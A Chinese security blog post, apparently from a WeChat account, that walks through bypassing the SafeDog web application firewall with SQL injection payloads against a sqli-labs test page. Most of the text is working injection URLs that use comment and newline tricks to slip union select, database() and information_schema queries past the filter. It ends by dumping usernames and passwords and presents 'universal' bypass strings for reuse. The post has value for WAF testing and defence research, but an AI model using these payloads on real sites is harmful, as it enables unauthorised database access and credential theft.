> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Fk3kz-oXuwXTOFaguGTpCw)

✎ 阅读须知

  

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经允许，禁止转载！

本文所提供的工具仅用于学习，禁止用于其他，请在24小时内删除工具文件！！！

  

 ![](http://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1A9eSovMjmg3vTs8uzRyicthuDpqskG1VEM5oAZ0VEFs822aickkgVrKyN4domWdEoxg7Z2OlkoWRVg/0?wx_fmt=png) ** 乌鸦安全 ** 专注于网络安全技术分享，红蓝对抗技术、免杀、反制、内网漫游、安全研究。 76篇原创内容   公众号

更新时间：2021.10.21

1. 版本
=====

当前版本是最新版安全狗 主程序版本号为：v4.0.23137  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CLgsLqicr8Ygt4RzLBBv0Evxj8CNUTiaYI9WySEcpia3c8gQQiaVjod7oZicbJ3XONuontveKygvx2jLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")

上一次的版本为 主程序版本号为：v4.0.26655

![图片](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CLgsLqicr8Ygt4RzLBBv0EvwaJ7daTTn6iazbTibCnKZSnD8DVjv8ZicVEHra7NFNzeibAPyhkHBUMvVA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")

所以这次已经对安全狗进行了升级。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CLgsLqicr8Ygt4RzLBBv0EvDvHzXIhSVuyU7sbnciaTjPbosiaI1SXriam5LESAxADd1bnVICoiaw7ichw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "null")  

2. 开始绕
======

按照ling老板的笔记，继续：

```
关键：/*//------/*/  
安全狗 order by 绕过id=1%27%20order%20/*//------/*/--+%20%0Aby%203--+s  
精简版：id=1%27%20order%20/*//--/*/by%203--+  
过union select -1%27%20union%20/*//--/*/select%201,2,3--+  
过关键字database：d=-1%27%20union%20/*//--/*/select%201,database/*//--/*/(),3--+  
  
测试：http://127.0.0.1/sqli/Less-1/?id=-1'union%20/*//--/*/select%201,2,concat(schema_name) from /*/--/information_/schema.--/*/schemata--+*/%23  
http://10.0.66.157/sqli/Less-1/?id=-1'union%20/*//--/*/select%201,2,concat(username) from /*/--/information_/schema.--/*/users--+*/%23  
http://10.0.66.157/sqli/Less-1/?id=-1'union%20/*//--/*/select%201,2,concat(username) from /*/--/*/users--+*/%23  
  
  
单独的from 不拦截 schema.schemata也不拦截， information_schema拦截，from information拦截，from/*//--/*/information不拦截  
  
  
  
查库：select schema_name from information_schema.schemata  
查表：select table_name from information_schema.tables where table_schema='security'  
查字段：select column_name from information_schema.columns where table_name='users'  
查字段的值：select username,password from security.users
```

ling老板口算一个字符，非常重要`%20/*//--/*/`接下来的操作都是在此基础上实现的。

2.1 order by 语句
---------------

`http://192.168.127.131/sqli/Less-1/?id=1' order by 1 --+` 拦截![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")  

`http://192.168.127.131/sqli/Less-1/?id=1' order /*//--/*/ by 121 --+`  bypass成功

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")  

2.2  union select语句
-------------------

`http://192.168.127.131/sqli/Less-1/?id=1' union /*//--/*/ select 1,2, 3 --+` 绕过![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")  

`http://192.168.127.131/sqli/Less-1/?id=1' union /*//--/*/ /*!--+/*%0aselect/*!1,2,3*/ --+` 同样可以绕过

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")  

2.3 database()关键字
-----------------

`http://192.168.127.131/sqli/Less-1/?id=1' union /*//--/*/ select 1,2, database() --+` 拦截

`http://192.168.127.131/sqli/Less-1/?id=-1' union /*//--/*/ /*!--+/*%0aselect/*!1,2,*/database /*//--/*/ () --+`  正常

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")image.png

2.4 获取其他的库
----------

`http://192.168.127.131/sqli/Less-1/?id=-1' union /*//--/*/ select 1,2, group_concat(schema_name) from information_schema.schemata --+`拦截

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")  

这里经过多次fuzz，后来发现狗狗对`information_schema.schemata` 拦截比较厉害，

`http://192.168.127.131/sqli/Less-1/?id=-1' union /*//--/*/ select 1,2, group_concat(schema_name) from information_schema. /*//--/*/ schemata --+` 还是被拦截

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")那在这里还是无法绕过，在这里就使用以前的一个`%0a`试试

`/*!06447%23%0afrom*/`

因此在这里可以使用

```
http://192.168.127.131/sqli/Less-1/?id=-1'   union   /*//--/*/ select 1,2, group_concat(schema_name)    /*!from*/    /*!--+/*%0ainformation_schema./*!schemata*/ --+
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")  

当然，在上次发的教程中，上面的那个被拦截了，但是在这更新之后，并未进行拦截，所以以前的方法在这里也可以使用`union select 1,2,3` 转换为: `union /*!--+/*%0aselect/*!1,2,*/3`

```
http://192.168.127.131/sqli/Less-1/?id=-1'   union   /*!--+/*%0aselect/*!1,2,*/  group_concat(schema_name)    /*!from*/    /*!--+/*%0ainformation_schema./*!schemata*/ --+
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

2.5 一次性获取所有的表
-------------

```
http://192.168.127.131/sqli/Less-1/?id=-1'   union /*!--+/*%0aselect/*!1,2,*/  group_concat(table_name)    /*!from*/     /*!--+/*%0ainformation_schema./*!tables*/ where table_schema='security' --+
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

2.6 一次性获取所有的字段
--------------

```
http://192.168.127.131/sqli/Less-1/?id=-1'  union /*!--+/*%0aselect/*!1,2,*/  group_concat(column_name)    /*!from*/     /*!--+/*%0ainformation_schema./*!columns*/ where table_name='users' --+
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

2.7 一次性获取字段里面的值
---------------

```
http://192.168.127.131/sqli/Less-1/?id=-1'  union /*!--+/*%0aselect/*!1,2,*/  group_concat(concat_ws(0x7e,username, password))     /*!from*/    security.users --+
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

3. 总结
=====

这个和上次的绕过相比较，更加简单了，万能的绕过方法依旧可以使用 这里比较重要的点：

万能符号：`union select`  --> `union/*//--/*/select`

`union select 1,2,3`  -->  `union /*!--+/*%0aselect/*!1,2,*/ 3`

不过从版本上看，好像还是没变的

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "null")

  

tips：加我wx，拉你入群，一起学习

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

扫取二维码获取

更多精彩

乌鸦安全

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)